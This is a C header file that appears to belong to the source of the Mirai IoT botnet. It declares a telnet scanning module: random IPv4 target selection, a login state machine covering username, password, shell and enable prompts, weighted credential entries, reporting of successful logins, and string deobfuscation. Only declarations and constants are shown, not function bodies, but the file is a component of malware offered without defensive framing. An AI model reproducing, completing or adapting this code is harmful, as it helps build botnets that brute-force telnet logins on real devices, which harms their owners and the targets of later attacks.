#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef DEBUG
#define SCANNER_MAX_CONNS   4
#define SCANNER_RAW_PPS     160
#else
#define SCANNER_MAX_CONNS   4
#define SCANNER_RAW_PPS     160
#endif

#define SCANNER_RDBUF_SIZE  1024
#define SCANNER_HACK_DRAIN  256

#define TELNET_IAC            0xff // 255 Interpret as Command
#define TELNET_WILL           0xfb // 251 Will option
#define TELNET_WONT           0xfc // 252 Won't option
#define TELNET_DO             0xfd // 253 Do option
#define TELNET_DONT           0xfe // 254 Don't option
#define TELNET_AUTHENTICATION 0x25 //
#define TELNET_ENCRYPT        0x26 //

struct scanner_auth
{
    char *username;
    char *password;
    uint16_t weight_min, weight_max;
    uint8_t username_len, password_len;
};

struct scanner_connection
{
    struct scanner_auth *auth;
    int fd, last_recv;
    enum
    {
        SC_CLOSED,              //  0
        SC_CONNECTING,          //  1
        SC_HANDLE_IACS,         //  2
        SC_WAITING_USERNAME,    //  3
        SC_WAITING_PASSWORD,    //  4
        SC_WAITING_PASSWD_RESP, //  5
        SC_WAITING_ENABLE_RESP, //  6
        SC_WAITING_SYSTEM_RESP, //  7
        SC_WAITING_SHELL_RESP,  //  8
        SC_WAITING_SH_RESP,     //  9
        SC_WAITING_TOKEN_RESP   // 10
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    unsigned char rdbuf[SCANNER_RDBUF_SIZE];
    uint8_t tries;
};

void scanner_init();
void scanner_kill(void);

static void setup_connection(struct scanner_connection *);
static ipv4_t get_random_ip(void);

static int consume_iacs(struct scanner_connection *);
static int consume_any_prompt(struct scanner_connection *);
static int consume_user_prompt(struct scanner_connection *);
static int consume_pass_prompt(struct scanner_connection *);
static int consume_resp_prompt(struct scanner_connection *);

static void add_auth_entry(char *, char *, uint16_t);
static struct scanner_auth *random_auth_entry(void);
static void report_working(ipv4_t, uint16_t, struct scanner_auth *);
static char *deobf(char *, int *);
static BOOL can_consume(struct scanner_connection *, uint8_t *, int);
